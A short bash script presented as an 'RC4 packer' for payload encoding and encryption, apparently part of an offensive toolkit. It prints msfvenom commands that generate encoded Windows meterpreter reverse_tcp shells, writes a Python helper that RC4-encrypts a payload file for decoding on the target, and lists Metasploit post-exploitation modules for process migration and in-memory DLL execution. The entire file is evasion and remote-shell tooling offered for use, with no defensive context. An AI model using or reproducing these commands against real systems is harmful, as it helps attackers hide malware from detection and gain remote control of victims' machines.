#!/usr/bin/env bash
# ==============================================================================
# RC4 PACKER — Payload encoding/encryption
# Usage: bash rc4_packer.sh <PAYLOAD_FILE> <OUTPUT_FILE>
# ==============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../../lib/common.sh" 2>/dev/null || true
PAYLOAD="${1:-}"; OUTPUT="${2:-}"
[[ -z "$PAYLOAD" || -z "$OUTPUT" ]] && { echo "Usage: bash rc4_packer.sh <input> <output>"; exit 1; }
[[ -f "$PAYLOAD" ]] || { echo "Input file not found: $PAYLOAD"; exit 1; }
echo ""; echo "=== RC4 PACKER ==="; echo ""
echo -e "--- ${BLUE}MSF Encoders${NC} ---"
echo "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -e x64/xor_dynamic -i 5 > encoded.bin"
echo "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -e x64/zutto_dekiru -i 3 > encoded.bin"
echo ""
echo -e "--- ${BLUE}Custom RC4 Encryption${NC} ---"
cat > /tmp/rc4.py << 'PYEOF'
import sys, os
from Crypto.Cipher import ARC4
key = os.urandom(16)
with open(sys.argv[1], 'rb') as f: data = f.read()
cipher = ARC4.new(key)
encrypted = cipher.encrypt(data)
with open(sys.argv[2], 'wb') as f:
    f.write(key + encrypted)
print(f"Key (hex): {key.hex()}")
PYEOF
echo "python3 /tmp/rc4.py $PAYLOAD $OUTPUT"
echo "# Then decode in target with same key"
echo ""
echo -e "--- ${BLUE}MSF Post-Exploitation Evasion${NC} ---"
echo "run post/windows/manage/migrate"
echo "run post/windows/manage/process_migrate"
echo "run post/windows/manage/execute_dll_memdll"
